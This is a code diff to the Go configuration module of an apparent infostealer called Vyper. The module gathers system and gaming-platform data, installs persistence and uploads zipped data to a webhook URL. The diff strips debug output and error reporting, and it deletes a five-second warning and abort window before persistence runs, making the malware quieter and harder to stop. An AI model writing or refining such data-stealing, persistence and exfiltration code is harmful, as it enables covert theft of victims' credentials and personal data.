@@ -1,7 +1,6 @@
 package config
 
 import (
-	"fmt"
 	"strconv"
 	"strings"
 	"time"
@@ -62,7 +61,6 @@ func Parse(configfile string) Vyper {
 }
 
 func (config *Vyper) Run() {
-	fmt.Printf("[DEBUG] Starting Vyper Run()\n")
 	var data exfiltration.DataStruct
 
 	data.SysInfo = infostealer.System()
@@ -72,8 +70,6 @@ func (config *Vyper) Run() {
 	}
 
 	if config.persist {
-		fmt.Printf("PERSISTANCE ENABLED BY ACCIDENT ABORT NOW YOU HAVE 5 SECONDS")
-		time.Sleep(5 * time.Second)
 		go persistance.Persist()
 	}
 
@@ -94,7 +90,6 @@ func (config *Vyper) Run() {
 		data.GamingPlatforms = infostealer.Gaming()
 	}
 
-	fmt.Printf("[DEBUG] Exfiltrating data into ZipMap...\n")
 	zipMap := data.Exfiltrate()
 
 	if config.webhook {
@@ -103,14 +98,7 @@ func (config *Vyper) Run() {
 				continue
 			}
 
-			fmt.Printf("[DEBUG] Processing %s (%d bytes)\n", category, len(zipData))
-			err := exfiltration.PostFileWebhook(config.webhookurl, zipData, category, &data)
-
-			if err != nil {
-				fmt.Printf("[DEBUG] %s FAILED: %v\n", category, err)
-			} else {
-				fmt.Printf("[DEBUG] %s SUCCESS\n", category)
-			}
+			exfiltration.PostFileWebhook(config.webhookurl, zipData, category, &data)
 		}
 	}
 }
